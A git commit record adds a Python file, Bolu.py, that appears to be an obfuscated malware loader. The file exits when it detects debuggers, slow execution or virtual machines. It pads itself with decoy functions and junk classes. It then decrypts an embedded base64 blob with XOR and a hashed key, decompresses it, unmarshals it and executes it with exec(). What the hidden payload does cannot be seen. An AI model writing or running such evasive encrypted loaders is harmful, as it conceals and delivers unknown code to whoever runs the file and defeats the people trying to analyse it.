4ebd8e2a698de9e919b0c63d7a9f05beb99d2787
QrwszXnXnchommed0e56 <mizaucangkudu690@gmail.com>
2026-02-19 13:04:29 +0700

    Add files via upload

---
+++ Bolu.py
@@ -0,0 +1,106 @@
+import sys
+import os
+
+import sys
+import os
+import time
+_UWJhAHZmpFpmepG_ = lambda: None
+__xRrzwOEeKVtIMfT = time.time()
+def __qeZKbHyMgkZRmrL__():
+    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
+        os._exit(0)
+    if 'debugpy' in sys.modules or 'pdb' in sys.modules:
+        os._exit(0)
+    _BOFTuDpGvljQQUC__ = time.time()
+    if _BOFTuDpGvljQQUC__ - __xRrzwOEeKVtIMfT > 0.5:
+        os._exit(0)
+__qeZKbHyMgkZRmrL__()
+
+def _nfmDbrlyDcjYGQx__():
+    import os
+    import sys
+    __IZIHTJMPeAFqjTP__ = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels']
+    for item in __IZIHTJMPeAFqjTP__:
+        if item in str(os.environ).lower():
+            sys.exit(0)
+    try:
+        import platform
+        if 'microsoft' in platform.uname().release.lower():
+            pass
+    except:
+        pass
+_nfmDbrlyDcjYGQx__()
+
+def _NrzADPCKwzXbdJJ_(__DAFAaTZlwsHaOTW):
+    _ulZYnBOOCIxPckb = [58, 41, 42, 75, 18, 8, 99, 13, 19, 3]
+    return sum(_ulZYnBOOCIxPckb) * __DAFAaTZlwsHaOTW if __DAFAaTZlwsHaOTW > 0 else None
+def __AQJEbcjVRcLgSOJ_(_cqyjLZNcPoaBfSW_):
+    __udOKCRzrluKJdTa_ = [70, 72, 7, 98, 79, 37, 95, 6, 52, 100]
+    return sum(__udOKCRzrluKJdTa_) * _cqyjLZNcPoaBfSW_ if _cqyjLZNcPoaBfSW_ > 0 else None
+def __TfhJmLkysjWLwTW__(__ERZBiGpYAMhRXeR):
+    __eFReFmYIRyAzROb_ = [68, 29, 12, 31, 18, 89, 81, 42, 25, 90]
+    return sum(__eFReFmYIRyAzROb_) * __ERZBiGpYAMhRXeR if __ERZBiGpYAMhRXeR > 0 else None
+def _ZXIsdNpVAGfIJQs(__CmALerBEPRomRbZ__):
+    __riPPxsyNXowrCjS__ = [95, 72, 98, 65, 22, 85, 10, 14, 49, 17]
+    return sum(__riPPxsyNXowrCjS__) * __CmALerBEPRomRbZ__ if __CmALerBEPRomRbZ__ > 0 else None
+def _YiYaWCPAMkULFAy__(_swYGbDLVaDPrnNq):
+    _lJWMClQwpYxJykc_ = [52, 65, 36, 5, 2, 15, 37, 58, 22, 17]
+    return sum(_lJWMClQwpYxJykc_) * _swYGbDLVaDPrnNq if _swYGbDLVaDPrnNq > 0 else None
+def __oIGEyXRCBmHCfyf__(__WQjEBqVrGfwFEQQ):
+    _tXVnJLEYBaZCLlz_ = [96, 68, 44, 73, 26, 39, 98, 68, 75, 61]
+    return sum(_tXVnJLEYBaZCLlz_) * __WQjEBqVrGfwFEQQ if __WQjEBqVrGfwFEQQ > 0 else None
+def _aXehOBwCdijKYOs(_hQPZLIbZvOXucwH):
+    _uAPEpWAzoMmmVRn_ = [11, 88, 5, 36, 54, 86, 89, 42, 71, 78]
+    return sum(_uAPEpWAzoMmmVRn_) * _hQPZLIbZvOXucwH if _hQPZLIbZvOXucwH > 0 else None
+def _ksLyWLWPhmmnWQX__(_kJKpvdXzOjojFIv_):
+    __yWraFxYlueysurO__ = [27, 23, 44, 43, 46, 71, 79, 4, 47, 81]
+    return sum(__yWraFxYlueysurO__) * _kJKpvdXzOjojFIv_ if _kJKpvdXzOjojFIv_ > 0 else None
+
+import base64
+import zlib
+import marshal
+import hashlib
+__jPaPQBBvWxtJJbA__ = ['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', 'K8ZEn+1SbNhn0F8RMqZ6erJ1Hd1xqB5+Jw==']
+__jPaPQBBvWxtJJbA__ = ''.join(__jPaPQBBvWxtJJbA__)
+def _UIlMkKqJIpRKecx(data, key):
+    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+def _jdMXOckMwwJmOAz__():
+    __qNDgHGLiRpzilix_ = ''.join([chr(0x35),chr(98^0^0),chr(102-47),chr(98-48),chr(98^0^0),chr(101^0^0),chr(64-8),chr(80-23),chr(48),chr(0x33),chr(54^0^0)])+''.join([chr(101^0^0),chr(0x62),chr(56),chr(57^0^0),chr(56-2),chr(82-31),chr(0x32),chr(0x65),chr(55^0^0)])+''.join([chr(0x36),chr(0x35),chr(100),chr(108-7),chr(102-49),chr(0x36),chr(57^0^0),chr(0x61)])+''.join([chr(108-7),chr(57^0^0),chr(54),chr(0x65)])+''.join([chr(90-39)])+''.join([chr(60-9),chr(0x33),chr(49^0^0),chr(51)])
+    __ivyjOHwQiFvSIpU__ = hashlib.sha256(__qNDgHGLiRpzilix_.encode()).digest()
+    __EHLhbKHKkubvICz = base64.b64decode(__jPaPQBBvWxtJJbA__)
+    __EHLhbKHKkubvICz = _UIlMkKqJIpRKecx(__EHLhbKHKkubvICz, __ivyjOHwQiFvSIpU__)
+    __HmqHjQAwLRMfNzK = zlib.decompress(__EHLhbKHKkubvICz)
+    __jykiMQeJRuyQXcl = marshal.loads(__HmqHjQAwLRMfNzK)
+    return __jykiMQeJRuyQXcl
+_HBCQagmOIXUtrEu = _jdMXOckMwwJmOAz__()
+exec(_HBCQagmOIXUtrEu)
+
+class __ePxVenGwGG__:
+    def __frgSkhrBgomz__(self,*p):
+        self.author = '_wDprVKeI'
+        return f'{p[0]}{self.__frgSkhrBgomz__(*p[1:])}' if p else ''
+    
+    def __init__(self, e):
+        self.c = [['a', 4, 4], ['b', 'b', 5, 8, 'b'], [4, 'c', 5, 'c', 'c', 3], [6, 'd'], ['e', 'e', 'e', 'e', 8, 'e'], [3, 'f', 'f'], ['g', 4, 'g', 3, 'g', 'g'], ['h', 3, 'h', 'h'], ['i', 8, 4, 'i', 'i'], ['j', 'j', 'j', 'j', 0, 'j'], ['k', 'k', 0, 'k'], [6, 'l', 'l', 'l'], [5, 'm', 'm', 'm'], [1, 6], ['o', 'o', 'o'], ['p', 7, 4], ['q', 'q', 'q'], ['r', 'r', 'r'], [5, 's', 's', 's'], ['t', 't'], ['u', 6], [5, 'v', 4], ['w', 1, 'w'], [2, 7, 2, 'x', 'x', 'x'], [4, 'y', 6, 2], [9, 'z'], [2, 5, '0', '0', 4], [0, 2, '1'], [2, 4, '2', '2', '2'], ['3', 2, '3', '3'], ['4', '4'], [6, '5', 7], [3, '6', '6', '6', 9], ['7', 6], [9, 5, '8', 5, '8', '8'], ['9', '9', 8, '9', 3, '9'], [4, '_', 0, '_', '_']]
+        self.w=0
+        self.____ePxVenGwGG__=len(self.c)
+        
+        for self.i in range(self.____ePxVenGwGG__//2):
+            try:
+                self._pQmKAkXEIVvv_=self.i*2
+                self.__uuWbiIRZZQBO__=self.____ePxVenGwGG__-self.i-1
+                self.__nnjbogSsuGhp__=self.c[self._pQmKAkXEIVvv_]
+                self._mSNREoPvOOwW=self.c[self.__uuWbiIRZZQBO__]
+                
+                for self.j in range(len(self.__nnjbogSsuGhp__)):
+                    self.e1=self.__nnjbogSsuGhp__[self.j%len(self.__nnjbogSsuGhp__)]
+                    if type(self.e1) is str: self.w+=ord(self.e1[0])
+                    elif type(self.e1) is int: self.w-=self.e1
+                
+                self.__myonbpHYqHvH_=self.__frgSkhrBgomz__(self.c[self.i][0],self.c[self.i][-1])
+                if len(self.__myonbpHYqHvH_)>5:setattr(self, '__RGATjvoKIuVe', self.__myonbpHYqHvH_)
+            
+            except:
+                self.w+=1
+
+__ePxVenGwGG__([[2, 3, 0, 3, 2, 0, 2, 0, 2, 1, 1, 3, 4, 1, 3, 0, 4, 4, 0, 3, 3, 3, 4, 3, 2, 2, 0, 2, 4, 3, 3, 1, 3, 1, 1, 4, 4, 3, 3, 3, 2, 2, 3, 2, 1, 1, 1, 3, 1, 1, 2, 1, 0], [0, 3, 0, 3, 1, 2, 0, 2, 4, 3, 1, 4, 0, 3, 3, 2, 0, 2, 1, 0, 0, 1, 0, 1, 3, 2, 2, 2, 2, 3, 2, 3, 3, 4, 3, 1, 1, 1, 3, 3, 2, 4, 2, 3, 3, 0, 0, 4, 4, 2, 1, 2, 3, 2, 4, 3, 1, 3, 0, 3, 1, 3, 3, 1, 1, 1], [1, 1, 2, 4, 0, 4, 0, 3, 4, 4, 0, 0, 4, 0, 0, 1, 4, 4, 2, 1, 2, 1, 0, 1, 1, 2, 2, 1, 4, 0, 4, 4, 0, 1, 2, 1, 1, 4, 2, 4, 1, 1, 4, 1, 3, 3, 3, 3, 0, 3, 3, 3], [0, 4, 3, 2, 2, 0, 1, 4, 0, 1, 3, 2, 1, 4, 0, 1, 4, 0, 1, 1, 3, 3, 0, 3, 1, 3, 3, 2, 2, 2, 3, 1, 3, 4, 0, 0, 0, 0, 2, 3, 1, 1, 4, 1, 3, 4, 2, 0, 1, 4, 3, 3, 3, 1, 4, 0, 4, 1, 2, 2, 2, 1, 2, 0], [2, 3, 0, 1, 4, 4, 2, 3, 4, 3, 3, 2, 1, 2, 2, 3, 0, 3, 1, 1, 0, 4, 2, 3, 4, 1, 1, 0, 1, 4, 3, 2, 2, 4, 0, 1, 4, 2, 1, 2, 4, 2, 1, 3, 3, 1, 0, 1, 4, 1, 0, 3, 4, 0, 1, 2, 3, 0, 3, 3, 3, 4, 2]])
